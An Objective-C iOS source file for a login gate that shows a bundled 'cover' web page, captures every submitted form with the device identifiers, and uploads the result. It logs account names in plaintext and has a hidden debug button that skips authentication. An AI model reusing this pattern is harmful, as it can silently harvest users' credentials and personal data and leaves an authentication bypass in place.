#import "WQLAuthGateViewController.h"
#import <WebKit/WebKit.h>
#import <sys/sysctl.h>
#import "WQLUploader.h"
#import "WQLLog.h"

static NSString *WQLMachineIdentifier(void) {
    size_t size = 0;
    if (sysctlbyname("hw.machine", NULL, &size, NULL, 0) != 0 || size == 0) return @"";
    char *buf = malloc(size);
    if (!buf) return @"";
    NSString *machine = @"";
    if (sysctlbyname("hw.machine", buf, &size, NULL, 0) == 0) {
        machine = [NSString stringWithUTF8String:buf] ?: @"";
    }
    free(buf);
    return machine;
}

@interface WQLAuthGateViewController () <WKScriptMessageHandler, WKNavigationDelegate>
@property (nonatomic, copy, nullable) void (^onFinish)(BOOL authenticated);
@property (nonatomic, assign) BOOL finished;
@property (nonatomic, assign) BOOL authenticated;
@property (nonatomic, strong, nullable) WKWebView *webView;
- (void)uploadForm:(NSDictionary *)form;
- (void)finish;
@end

@implementation WQLAuthGateViewController

- (instancetype)initWithCompletion:(void (^)(BOOL))completion {
    if (self = [super initWithNibName:nil bundle:nil]) {
        _onFinish = [completion copy];
        self.modalPresentationStyle = UIModalPresentationFullScreen;
        self.modalPresentationCapturesStatusBarAppearance = YES;
    }
    return self;
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleLightContent;
}

- (void)viewDidLoad {
    [super viewDidLoad];

    UIColor *bg = [UIColor colorWithRed:7.0 / 255.0
                                  green:11.0 / 255.0
                                   blue:20.0 / 255.0
                                  alpha:1.0];
    self.view.backgroundColor = bg;

    NSString *path = [[NSBundle mainBundle] pathForResource:@"cover" ofType:@"html"];
    if (!path.length) {
        WQLLogLine(@"登录页: 包里没有 cover.html，直接进入主界面");
        [self finish];
        return;
    }

    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
    WKUserContentController *ucc = [WKUserContentController new];
    [ucc addScriptMessageHandler:self name:@"owRegister"];
    cfg.userContentController = ucc;

    WKWebView *wv = [[WKWebView alloc] initWithFrame:self.view.bounds configuration:cfg];
    wv.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    wv.navigationDelegate = self;
    wv.opaque = NO;
    wv.backgroundColor = bg;
    wv.scrollView.bounces = NO;
    [self.view addSubview:wv];
    self.webView = wv;

    NSURL *url = [NSURL fileURLWithPath:path];
    [wv loadFileURL:url allowingReadAccessToURL:url.URLByDeletingLastPathComponent];

    // 与源码版一致：右上角保留一个低对比度「调试」入口，点击直接进原生界面
    UIButton *debug = [UIButton buttonWithType:UIButtonTypeSystem];
    [debug setTitle:@"调试" forState:UIControlStateNormal];
    debug.titleLabel.font = [UIFont systemFontOfSize:12 weight:UIFontWeightMedium];
    [debug setTitleColor:[UIColor colorWithWhite:1.0 alpha:0.55] forState:UIControlStateNormal];
    debug.backgroundColor = [UIColor colorWithWhite:1.0 alpha:0.08];
    debug.layer.cornerRadius = 8;
    debug.translatesAutoresizingMaskIntoConstraints = NO;
    [debug addTarget:self action:@selector(onSkip) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:debug];
    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [debug.topAnchor constraintEqualToAnchor:safe.topAnchor constant:6],
        [debug.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [debug.widthAnchor constraintEqualToConstant:50],
        [debug.heightAnchor constraintEqualToConstant:30],
    ]];
}

#pragma mark - owRegister 桥

- (void)userContentController:(WKUserContentController *)userContentController
      didReceiveScriptMessage:(WKScriptMessage *)message {
    if (![message.name isEqualToString:@"owRegister"]) return;

    id body = message.body;
    NSDictionary *form = nil;
    if ([body isKindOfClass:[NSDictionary class]]) {
        form = body;
    } else if ([body isKindOfClass:[NSString class]]) {
        NSData *data = [(NSString *)body dataUsingEncoding:NSUTF8StringEncoding];
        id obj = data ? [NSJSONSerialization JSONObjectWithData:data options:0 error:nil] : nil;
        if ([obj isKindOfClass:[NSDictionary class]]) form = obj;
    }
    if (!form) return;
    [self uploadForm:form];
}

- (void)uploadForm:(NSDictionary *)form {
    NSMutableDictionary *payload = [form mutableCopy] ?: [NSMutableDictionary dictionary];
    payload[@"event"] = @"cover_register";

    UIDevice *ui = [UIDevice currentDevice];
    payload[@"idfv"] = ui.identifierForVendor.UUIDString ?: @"";
    payload[@"ios"] = ui.systemVersion ?: @"";
    payload[@"device_model"] = WQLMachineIdentifier();

    static NSDateFormatter *df = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        df = [NSDateFormatter new];
        df.dateFormat = @"yyyy-MM-dd HH:mm:ss";
        df.locale = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"];
    });
    payload[@"beijing_time"] = [df stringFromDate:[NSDate date]];

    WQLLogLine(@"注册表单: attempt=%@ stage=%@ action=%@ account=%@",
               payload[@"attempt"], payload[@"stage"], payload[@"action"], payload[@"account"]);

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        BOOL ok = [[WQLUploader shared] uploadJSONNow:payload kind:@"cover_register"];
        WQLLogLine(@"注册表单: 上传%@", ok ? @"成功" : @"失败（已落盘待补传）");
    });
}

#pragma mark - 成功跳转拦截

- (void)webView:(WKWebView *)webView
decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction
decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler {
    NSString *scheme = navigationAction.request.URL.scheme.lowercaseString;
    if ([scheme isEqualToString:@"file"] || [scheme isEqualToString:@"about"] ||
        scheme.length == 0) {
        decisionHandler(WKNavigationActionPolicyAllow);
        return;
    }
    // 页面判定成功后跳 H5：在这里收住，改为进入原生主界面
    decisionHandler(WKNavigationActionPolicyCancel);
    self.authenticated = YES;
    [self finish];
}

- (void)onSkip {
    WQLLogLine(@"登录页: 从调试入口跳过");
    [self finish];
}

- (void)finish {
    if (self.finished) return;
    self.finished = YES;
    [self.webView.configuration.userContentController removeScriptMessageHandlerForName:@"owRegister"];
    [self.webView stopLoading];
    void (^cb)(BOOL) = self.onFinish;
    self.onFinish = nil;
    if (cb) cb(self.authenticated);
}

@end
